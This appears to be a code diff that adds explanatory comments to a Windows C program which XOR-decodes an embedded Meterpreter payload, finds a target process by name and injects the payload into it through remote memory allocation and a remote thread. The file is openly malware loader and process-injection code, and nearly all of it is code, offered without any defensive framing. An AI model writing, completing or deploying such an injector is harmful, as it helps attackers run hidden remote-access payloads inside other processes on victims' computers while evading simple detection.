@@ -3,14 +3,35 @@
 #include <stdlib.h>
 #include <string.h>
 #include <tlhelp32.h>
-#include "buffer.h"
+#include "buffer.h" // Buffer containing the XORed Meterpreter payload
 
+/* 
+ * This function performs an XOR encryption/decryption on the input data.
+ *
+ * @param data: Pointer to the data to be encrypted/decrypted
+ * @param data_len: Length of the data
+ *
+ * The function XORs each byte of the input data with a fixed key (0xAA).
+ * This is a simple and symmetric encryption method, meaning the same 
+ * function can be used for both encryption and decryption.
+ */
 void XOR(unsigned char* data, size_t data_len) {
     for (int i = 0; i < data_len; i++) {
         data[i] = data[i] ^ 0xAA;
     }
 }
 
+/*
+ * This function finds the process ID (PID) of a target process by its name.
+ *
+ * @param procname: Name of the target process (Unicode string)
+ * 
+ * @return process ID of the target process if found, otherwise 0.
+ *
+ * The function takes a snapshot of all processes in the system and then
+ * iterates through them to find a process that matches the given name.
+ * If a matching process is found, its process ID is returned.
+ */
 int FindTarget(const wchar_t* procname) { // Changed to wchar_t for Unicode
 
     HANDLE hProcSnap;
@@ -39,6 +60,19 @@ int FindTarget(const wchar_t* procname) { // Changed to wchar_t for Unicode
     return pid;
 }
 
+/*
+ * This function injects a given payload into a target process.
+ *
+ * @param hProc: Handle to the target process
+ * @param buf: Pointer to the buffer containing the code to be injected
+ * @param buf_len: Length of the buffer
+ *
+ * @return 0 if the injection is successful, otherwise -1.
+ *
+ * The function allocates memory in the target process for the code,
+ * writes the code to this allocated memory, and then creates a remote
+ * thread in the target process to execute the injected code.
+ */
 int Inject(HANDLE hProc, unsigned char* buf, unsigned int buf_len) {
 
     LPVOID pRemoteCode = NULL;
@@ -58,6 +92,9 @@ int Inject(HANDLE hProc, unsigned char* buf, unsigned int buf_len) {
     return -1;
 }
 
+/*
+ * The entry point for the application. This function contains the main code for the shellcode injection.
+ */
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
 
     int pid = 0;
